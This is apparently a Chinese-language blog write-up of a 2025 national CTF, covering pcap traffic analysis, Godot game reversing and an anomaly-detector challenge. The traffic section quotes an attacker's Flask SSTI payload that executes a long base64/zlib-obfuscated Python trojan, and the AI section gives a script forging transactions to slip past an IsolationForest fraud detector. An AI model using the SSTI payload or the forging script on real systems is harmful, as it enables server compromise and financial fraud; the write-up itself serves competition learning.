+++
date = '2026-01-08T08:27:30+08:00'
title = '2025 国赛 WP'
showToc = true
tags = ['write up', 'ctf']
+++

## 流量分析

### 1

应用过滤 http，找到最后一个 /admin/login

```http
192.379662	/admin/login	POST /admin/login HTTP/1.1  (application/x-www-form-urlencoded)

HTML Form URL Encoded: application/x-www-form-urlencoded
    Form item: "username" = "admin"
    Form item: "password" = "zxcvbnm123"
```

### 2

找到攻击者发送 SSTI Payload 的请求

```http
228.234055	/admin/preview	POST /admin/preview HTTP/1.1  (application/x-www-form-urlencoded)

HTML Form URL Encoded: application/x-www-form-urlencoded
    Form item: "preview_content" = "{{ config }}"
        Key: preview_content
        Value: {{ config }}
```

发现结果

```python
SECRET_KEY: c6242af0-6891-4510-8432-e1cdf051f160
```

### 3

找到这一行

```http
259.670311	/admin/preview	POST /admin/preview HTTP/1.1  (application/x-www-form-urlencoded)

{{url_for.__globals__['__builtins__']['exec']("import base64; exec(base64.b64decode('XyA9IGxhbWJkYSBfXyA6IF9faW1wb3J0X18oJ3psaWInKS5kZWNvbXByZXNzKF9faW1wb3J0X18oJ2Jhc2U2NCcpLmI2NGRlY29kZShfX1s6Oi0xXSkpOwpleGVjKChfKShiJz1jNENVM3hQKy8vdlB6ZnR2OGdyaTYzNWEwVDFyUXZNbEtHaTNpaUJ3dm02VEZFdmFoZlFFMlBFajdGT2NjVElQSThUR3FaTUMrbDlBb1lZR2VHVUFNY2Fyd1NpVHZCQ3YzN3lzK04xODVOb2NmbWpFL2ZPSGVpNE9uZTBDTDVUWndKb3BFbEp4THI5VkZYdlJsb2E1UXZyamlUUUtlRytTR2J5Wm0rNXpUay9WM25aMEc2TmVhcDdIdDZudSthY3hxc3Ivc2djNlJlRUZ4ZkVlMnAzMFlibXl5aXMzdWFWMXArQWowaUZ2cnRTc01Va2hKVzlWOVMvdE8rMC82OGdmeUtNL3lFOWhmNlM5ZUNEZFFwU3lMbktrRGlRazk3VFV1S0RQc09SM3BRbGRCL1VydmJ0YzRXQTFELzljdFpBV2NKK2pISkwxaytOcEN5dktHVmh4SDhETEw3bHZ1K3c5SW5VLzl6dDFzWC9Uc1VSVjdWMHhFWFpOU2xsWk1acjFrY0xKaFplQjhXNTl5bXhxZ3FYSkpZV0ppMm45NmhLdFNhMmRhYi9GMHhCdVJpWmJUWEZJRm1ENmtuR3ovb1B4ZVBUenVqUHE1SVd0OE5abXZ5TTVYRGcvTDhKVS9tQzRQU3ZYQStncWV1RHhMQ2x6Uk5ESEpVbXZ0a2FMYkp2YlpjU2c3VGdtN1VTZUpXa0NRb2pTaStJTklFajVjTjErRkZncEtSWG40Z1I5eXAzL1Y3OVduU2VFRklPNkM0aGNKYzRtd3BrKzA5dDF5dWU0K21BbGJobHhuWE0xUGZrK3NHQm1hVUZFMWtFak9wbmZHbnFzVithdU9xakpnY0RzaXZJZCt3SFBIYXp0NU1WczRySFJoWUJPQjZ5WGp1R1liRkhpM1hLV2hiN0FmTVZ2aHg3RjlhUGpObUlpR3FCVS9oUkZVdU1xQkNHK1ZWVVZBYmQ1cEZEVFpKM1A4d1V5bTZRQUFZUXZ4RytaSkRSU1F5cE9oWEsvTDRlRkZ0RXppdWZaUFN5cllQSldKbEFRc0RPK2RsaTQ2Y24xdTVBNUh5cWZuNHZ3N3pTcWUrVlVRL1JpL0tudjBwUW9XSDFkOWRHSndEZnFtZ3ZuS2krZ05SdWdjZlVqRzczVjZzL3RpaGx0OEIyM0t2bUp6cWlMUHptdWhyMFJGVUpLWmpHYTczaUxYVDRPdmxoTFJhU2JUVDR0cS9TQ2t0R1J5akxWbVNqMmtyMEdTc3FUamxMMmw2Yy9jWEtXalJNdDFrTUNtQ0NUVithSmU0bnB2b0I5OU9NbktuWlI0WXM1MjZtVEZUb1N3YTVqbXhCbWtSWUNtQTgyR0ZLN2FrNmJJUlRmRE1zV0dzWnZBRVh2M1BmdjVOUnpjSUZOTzN0YlFrZUIvTElWT1c1TGZBa21SNjgvNnpyTDBEWm9QanpGWkk1VkxmcTBydjlDd1VlSmtSM1BIY3VqKytkL2xPdms4L2gzSHpTZ1lUR0N3bDF1ano4aDRvVWlQeUdUNzROamJZN2ZKOHZVSHFOeitaVmZPdFZ3L3ozUk11cVNVekVBS3JqY1UyRE5RZWhCMG9ZN3hJbE9UOXU5QlQ0Uk9vREZvKzVaRjZ6Vm9IQTRlSWNrWFVPUDN5cFF2NXBFWUcrMHBXNE15SG1BUWZzT2FXeU1kZk1vcWJ3L005b0ltZEdLZEt5MVdxM2FxK3QreHV5VmROQVFNaG9XMkE3elF6b2I4WEdBM0c4VnVvS0hHT2NjMjVIQ2IvRlllU3hkd3lJZWRBeGtsTExZTUJIb2pUU3BEMWRFeG96ZGk4OUdpa2h6MzMwNW5kVG1FQ3YwWm9VT0hhY25xdFVVaEpseTdWZ3ZYK0psYXdBWTlvck5QVW1aTTdRS2JkT2tUZi9vOGFRbFM1RmUveFFrT01KR200TlhxTGVoaVJJYjkyNXNUZlZ4d29OZlA1djFNR2xhcllNaWZIbDJyRXA1QzcxaXBGanBBR2FFcDluUmowSmdFYTRsU1R1WWVWWHdxYlpRVDNPZlF2Z3QvYkhKbEFndXFTV3lzR2hxaElUSllNNlQxMG03MUppd2ZRSDVpTFhINVhiRms1M1FHY0cyY0FuRnJXeTcweEV2YWJtZjB1MGlrUXdwVTJzY1A4TG9FYS9DbEpuUFN1V3dpY01rVkxya1pHcW5CdmJrNkpUZzdIblQwdkdVY1Y2a2ZmSUw2Q0szYkUxRnkwUjZzbCtVUG9ZdmprZ1NJM1ViZkQ2N2JSeEl4ZWdCcFlUenlDRHpQeXRTRSthNzdzZHhzZ2hMcFVDNWh4ejRaZVhkeUlyYm1oQXFRdzVlRW5CdUFTRTVxVE1Ka1RwLy9oa3krZFQycGNpT0JZbi9BQ1NMeHByTFowQXkxK3pobCtYeVY5V0ZMNE5nQm9IMzRidmt4SDM2bmN0c3pvcFdHUHlkMTRSaVM0ZDBFcU5vY3F2dFd1M1l4a05nUCs4Zk0vZC9CMGlreEt4aC9HamttUVhhU1gvQis0MFU0YmZTYnNFSnBWT3NUSFR5NnUwTnI2N1N3N0J2Und1VnZmVDAvOGo3M2dZSEJPMmZHU0lKNDdBcllWbTIrTHpSVDBpSDVqN3lWUm1wdGNuQW44S2t4SjYzV0JHYjd1M2JkK0QrM3lsbm0xaDRBUjdNR042cjZMeHBqTmxBWDExd2EvWEIxek44Y1dVTm5DM1ZjemZ3VUV3UGZpNWR5bzluRUM1V085VW03OFdLUnJtM2M0OEl2VFVoZ2ROZVFFRG9zSWZoTVNtaWtFbHVRWDhMY0NSY0s5ZVVUODVidnI1SjVyekViK0R1aUdZeURGRzdQWmVmdkliM3czM3UycTh6bHhsdFdDU3RjNU80cThpV3JWSTd0YVpIeG93VHc1ekpnOVRkaEJaK2ZRclF0YzB5ZHJCbHZBbG5ZMTB2RUNuRlVCQSt5MWxXc1ZuOGNLeFVqVGRhdGk0QUYzaU0vS3VFdFE2Wm44Ykk0TFl3TWxHbkNBMVJHODhKOWw3RzRkSnpzV3I5eE9pRDhpTUkyTjFlWmQvUVV5NDNZc0lMV3g4MHlpQ3h6K0c0YlhmMnFOUkZ2Tk9hd1BTbnJwdjZRMG9GRVpvamx1UHg3Y09VMjdiQWJncHdUS28wVlV5SDZHNCt5c3ZpUXpVN1NSZDUxTEdHM1U2Y1QwWURpZFFtejJld3Ria2tLY0dWY1N5WU9lQ2xWNkNSejZiZEYvR20zVDIrUTkxNC9sa1piS3gxOVduWDc4cit4dzZicGp6V0xyMEUxZ2puS0NWeFcwWFNud2UraUc5ZGtHOG5DRmZqVWxoZFRhUzFnSjdMRnNtVWpuOHUvdlJRYlJMdy95NjZJcnIveW5LT0N6Uk9jZ3JuREZ4SDN6M0pUUVFwVGlEcGV5elJzRjRTbkdCTXY1SGJyK2NLNllUYTRNSWJmemo1VGkzRk1nSk5xZ0s1WGs5aHNpbEdzVTZ0VWJucDZTS2lKaFV2SjhicXluVU1Fem5kbCtTK09WUkNhSDJpSmw4VTNXanlCNjhScTRIQVRrL2NLN0xrSkhITWpDM1c3ZFRtT0JwZm9XTVZFTGFMK1JrcVdZdjBDcFc1cUVOTGxuT1BCckdhR05lSVphaHpibnJ1RVBJSVhHa0d6MWZFNWQ0Mk1hS1pzQ1VZdDF4WGlhaTkrY2JLR2ovZDBsSUNxN3VjN2JSaEVCeDQ2RHlCWFR6MWdmSm5UMnVyNng0QXZiNXdZMnBjWXJjRDJPUjZBaWtNdm0yYzBiaGFiSkI2bzBEaE9OSjRsQ3htS2RHQnp1d3J0czF1MEQyeXVvMzd5TExmc0dEdXllcE53OGx5VE5jMm55aENWQmZXMjNEbkJRbVdjMVFMQ29ScHBWaGpLWHdPcE9ES084UjhZSG5RTStyTGs2RU9hYkNkR0s1N2lSek1jVDN3YzQzNmtWbUhYRGNJMFpzWUdZNWFJQzVEYmRXalV0Mlp1VTBMbXVMd3pDVFM5OXpoT29POERLTnFiSzRiSU5MeUFJMlg5Mjh4aWIraG1JT3FwM29TZ0MyUGRGYzh5cXRoTjlTNTVvbXRleDJ4a0VlOENZNDhDNno0SnRxVnRxaFBRV1E4a3RlNnhsZXBpVllDcUliRTJWZzRmTi8vTC9mZi91Ly85cDRMejd1cTQ2eVdlbmtKL3g5MGovNW1FSW9yczVNY1N1Rmk5ZHlneXlSNXdKZnVxR2hPZnNWVndKZScpKQ=='))", {'request':url_for.__globals__['request'],'app':get_flashed_messages.__globals__['current_app']})}}
```

把里面的 base64 转换一下

```python
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
...
```

发现这首先定义了一个 \_ 函数，这个函数把参数倒过来再解码 base64 再解码 zlib 再返回，并且底下又是个循环嵌套的 base64，于是写这样的脚本：

```python
import zlib
import base64

def _(__):
    result = ''
    with open('result', 'wb') as f:
        result = zlib.decompress(base64.b64decode(__[::-1]))
        f.write(result)
    return result

exec((_)(b'=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'))
```

这会把每次转换的结果存到 `result` 文件里面，执行完后的 `result` 文件里找到了 key：

```python
RC4_SECRET = b'v1p3r_5tr1k3_k3y'
```

### 4

利用上一题的木马程序 得到加密通信的方式是 RC4 加密 密钥 **v1p3r_5tr1k3_k3y** 在 http 协议包里找到多个 data=...... 的字符串 猜测为加密通信内容 在 CyberChef 中解密得到操作过程

1. 从某个主机拉取 `shell.zip` 改名为 `123.zip`

2. 将 `123.zip` 解压为 `shell` ，密码为 **nf2jd092jd01**

3. 将 shell 改名为 **python3.13**

4. 调用该木马

5. 所以本体名称为 **python3.13**

## 逆向

### babygame

一看就知道是 Godot 引擎写的游戏，用 GDRE Tools（[https://github.com/GDRETools/gdsdecomp](https://github.com/GDRETools/gdsdecomp)）逆向这个项目，得到了 `flag.gd`

```gdscript
extends CenterContainer

@onready var flagTextEdit: Node = $PanelContainer / VBoxContainer / FlagTextEdit
@onready var label2: Node = $PanelContainer / VBoxContainer / Label2

static var key = "FanAglFanAglOoO!"
var data = ""

func _on_ready() -> void :
    Flag.hide()

func get_key() -> String:
    return key

func submit() -> void :
    data = flagTextEdit.text

    var aes = AESContext.new()
    aes.start(AESContext.MODE_ECB_ENCRYPT, key.to_utf8_buffer())
    var encrypted = aes.update(data.to_utf8_buffer())
    aes.finish()

    if encrypted.hex_encode() == "d458af702a680ae4d089ce32fc39945d":
        label2.show()
    else:
        label2.hide()

func back() -> void :
    get_tree().change_scene_to_file("res://scenes/menu.tscn")
```

可以看到这使用了 AES ECB 加密，使用解密的代码解密看一下

```gdscript
var a = "d458af702a680ae4d089ce32fc39945d".hex_decode()
aes.start(AESContext.MODE_ECB_DECRYPT, key.to_utf8_buffer())
var decrypted = aes.update(a)
print(decrypted.get_string_from_utf8())
```

发现还是不行，查看 `game_manager.gd`

```gdscript
extends Node

@onready var fan = $"../Fan"

var score = 0

func add_point():
    score += 1
    if score == 1:
        Flag.key = Flag.key.replace("A", "B")
        fan.visible = true
```

发现竟然会把 A 换成 B，于是我们把 `key` 改成 `FanBglFanBglOoO!` 再解密，得到 flag。

## AI

### The Silent Heist

利用题目的库进行训练：

```python
import pandas as pd
import numpy as np
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
import time

def load_and_analyze_data():
    """加载并分析数据"""

    # 从同目录加载实际的CSV文件
    df = pd.read_csv('public_ledger.csv')
    print("数据加载成功!")
    print(f"数据形状: {df.shape}")
    print(f"特征列: {list(df.columns)}")

    # 显示前几行数据
    print("\n前5行数据:")
    print(df.head())

    # 显示基本统计信息
    print("\n基本统计信息:")
    print(df.describe())

    return df

def train_model_with_feedback(df):
    """带实时反馈的模型训练"""
    print("开始训练Isolation Forest模型...")
    print(f"数据形状: {df.shape}")
    print(f"特征数量: {df.shape[1]}")

    # 显示前几个特征的统计信息
    print("\n特征统计摘要:")
    for i in range(min(5, len(df.columns))):  # 只显示前5个特征
        col = df.columns[i]
        print(f"  {col}: 均值={df[col].mean():.2f}, 标准差={df[col].std():.2f}")

    # 训练模型
    iso_forest = IsolationForest(contamination=0.1, random_state=42)

    print("\n正在训练模型...")
    start_time = time.time()

    # 训练过程反馈
    iso_forest.fit(df)

    end_time = time.time()
    print(f"模型训练完成! 耗时: {end_time - start_time:.2f}秒")

    # 显示模型性能
    print("\n模型性能摘要:")
    # 预测正常样本
    predictions = iso_forest.predict(df)
    normal_count = sum(predictions == 1)
    anomaly_count = sum(predictions == -1)
    print(f"  总样本数: {len(predictions)}")
    print(f"  正常样本: {normal_count}")
    print(f"  异常样本: {anomaly_count}")

    return iso_forest

def generate_fraudulent_transactions_with_feedback(df, model, target_amount=2000000):
    """带实时反馈的数据生成"""
    print(f"\n开始生成伪造交易记录...")
    print(f"目标总金额: ${target_amount:,.2f}")

    transactions = []
    total_amount = 0
    count = 0
    last_update = 0

    # 计算原始数据的统计特性
    original_means = df.mean()
    original_stds = df.std()

    while total_amount < target_amount and count < 10000:  # 增加最大迭代次数
        # 随机采样现有数据
        sample_idx = np.random.randint(0, len(df))
        sample_row = df.iloc[sample_idx].copy()

        # 对特征进行更精细的扰动，保持与原始数据相似的分布
        for i in range(20):
            if i == 0:  # feat_0 (交易金额)
                # 保持在合理范围内
                sample_row.iloc[i] = max(100, sample_row.iloc[i] * np.random.uniform(0.9, 1.1))
            else:
                # 使用原始数据的统计特性进行扰动
                # 计算原始数据该特征的均值和标准差
                mean_val = original_means.iloc[i]
                std_val = original_stds.iloc[i]
                # 确保扰动不会太大
                sample_row.iloc[i] = mean_val + np.random.normal(0, std_val * 0.1)

        transactions.append(sample_row)
        total_amount += sample_row.iloc[0]
        count += 1

        # 实时反馈
        if count % 100 == 0 or count == 1:
            progress = min(100, (total_amount / target_amount) * 100) if target_amount > 0 else 0
            print(f"  已生成 {count} 条交易，总金额: ${total_amount:,.2f} ({progress:.1f}%)")

            # 每1000条记录显示详细信息
            if count % 1000 == 0:
                avg_amount = total_amount / count
                print(f"    平均每笔金额: ${avg_amount:.2f}")

    print(f"\n生成完成!")
    print(f"  总交易数: {len(transactions)}")
    print(f"  总金额: ${total_amount:,.2f}")

    return pd.DataFrame(transactions)

def validate_transactions_with_feedback(df, model, fake_df):
    """验证生成数据的实时反馈"""
    print("\n验证生成的交易...")

    # 验证所有交易
    anomaly_scores = model.decision_function(fake_df)
    normal_count = sum(anomaly_scores > 0)
    anomaly_count = sum(anomaly_scores <= 0)

    print(f"  验证结果:")
    print(f"    总交易数: {len(fake_df)}")
    print(f"    正常交易: {normal_count}")
    print(f"    异常交易: {anomaly_count}")

    if anomaly_count > 0:
        print(f"  警告: 发现 {anomaly_count} 个异常交易!")
        # 显示前几个异常交易的分数
        anomaly_indices = np.where(anomaly_scores <= 0)[0][:3]
        for idx in anomaly_indices:
            print(f"    异常交易 {idx}: 分数 = {anomaly_scores[idx]:.4f}")
    else:
        print(f"  所有交易均被判定为正常!")

    return normal_count == len(fake_df)

def main():
    """主函数"""
    print("=== 沉默的劫案 - 数据伪造系统 ===")

    try:
        print("正在加载和分析数据...")
        df = load_and_analyze_data()
        print("数据加载完成!")

        print("\n正在训练模型...")
        model = train_model_with_feedback(df)
        print("模型训练完成!")

        # 尝试生成数据直到满足条件
        max_attempts = 3
        attempt = 0

        while attempt < max_attempts:
            print(f"\n第 {attempt + 1} 次尝试生成数据...")
            fake_df = generate_fraudulent_transactions_with_feedback(df, model, 2000000)

            print("\n正在验证生成的交易...")
            is_valid = validate_transactions_with_feedback(df, model, fake_df)

            if is_valid:
                print("\n生成的交易记录通过验证!")
                print(f"总金额: ${fake_df['f0'].sum():,.2f}")
                print(f"交易数量: {len(fake_df)}")

                # 输出CSV格式
                csv_output = fake_df.to_csv(index=False)
                final_output = csv_output + "EOF"

                print("\n=== 最终输出 ===")
                print(final_output)

                return final_output
            else:
                print(f"\n第 {attempt + 1} 次尝试失败，正在重新生成...")
                attempt += 1

        print("无法生成满足条件的数据，请检查模型或参数设置")
        return None

    except Exception as e:
        print(f"发生错误: {e}")
        import traceback
        traceback.print_exc()
        return None

if __name__ == "__main__":
    main()
```

将输出复制到 nc 连接，得到 flag

## 问卷

填写问卷即可
